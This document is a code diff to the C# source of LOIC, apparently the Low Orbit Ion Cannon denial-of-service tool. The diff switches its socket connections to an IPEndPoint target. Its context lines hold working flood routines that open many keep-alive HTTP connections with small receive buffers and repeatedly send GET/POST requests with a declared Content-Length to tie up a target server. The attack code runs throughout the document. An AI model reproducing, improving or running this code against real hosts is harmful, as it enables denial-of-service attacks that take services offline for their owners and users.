@@ -13,6 +13,7 @@
 using System;
 using System.Collections.Generic;
 using System.ComponentModel;
+using System.Net;
 using System.Net.Sockets;
 using System.Text;
 using System.Text.RegularExpressions;
@@ -173,6 +174,8 @@ namespace LOIC
 		{
 			try
 			{
+				IPEndPoint RHost = new IPEndPoint(IPAddress.Parse(_ip), _port);
+
 				int bsize = 16;
 				int mincl = 16384; // set minimal content-length to 16KB
 				byte[] sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0} HTTP/1.1{1}HOST: {2}{1}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){1}Keep-Alive: 300{1}Connection: keep-alive{1}{3}{1}", _subSite, Environment.NewLine, _dns, ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
@@ -189,11 +192,11 @@ namespace LOIC
 					// forget about slow! .. we have enough saveguards in place!
 					while (IsDelayed && (DateTime.UtcNow < stop))
 					{
-						var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+						var socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
 						socket.ReceiveBufferSize = bsize;
 						try
 						{
-							socket.Connect(((_ip == "") ? _dns : _ip), _port);
+							socket.Connect(RHost);
 							socket.Blocking = _resp; // beware of shitstorm of 10035 - 10037 errors o.O
 							if (_random == true)
 							{
@@ -214,9 +217,9 @@ namespace LOIC
 									{
 										if (!socket.Connected)
 										{
-											socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+											socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
 											socket.ReceiveBufferSize = bsize;
-											socket.Connect(((_ip == "") ? _dns : _ip), _port);
+											socket.Connect(RHost);
 										}
 										sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0} HTTP/1.1{1}HOST: {2}{1}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){1}Keep-Alive: 300{1}Connection: keep-alive{1}{3}{1}", redirect, Environment.NewLine, _dns, ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
 										socket.Send(sbuf);
@@ -410,6 +413,8 @@ namespace LOIC
 		{
 			try
 			{
+				IPEndPoint RHost = new IPEndPoint(IPAddress.Parse(_ip), _port);
+
 				// header set-up
 				byte[] sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("{3} {0} HTTP/1.1{1}HOST: {2}{1}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){1}Keep-Alive: 300{1}Connection: keep-alive{1}Content-Length: 42{1}{4}", _subSite, Environment.NewLine, _dns, ((_useget) ? "GET" : "POST"), ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
 				byte[] tbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("X-a: b{0}", Environment.NewLine));
@@ -428,10 +433,10 @@ namespace LOIC
 						{
 							sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("{4} {0}{1} HTTP/1.1{2}HOST: {3}{2}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){2}Keep-Alive: 300{2}Connection: keep-alive{2}Content-Length: 42{2}{5}", _subSite, Functions.RandomString(), Environment.NewLine, _dns, ((_useget) ? "GET" : "POST"), ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
 						}
-						var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+						var socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
 						try
 						{
-							socket.Connect(((_ip == "") ? _dns : _ip), _port);
+							socket.Connect(RHost);
 							socket.NoDelay = true;
 							socket.Blocking = false;
 							socket.Send(sbuf);
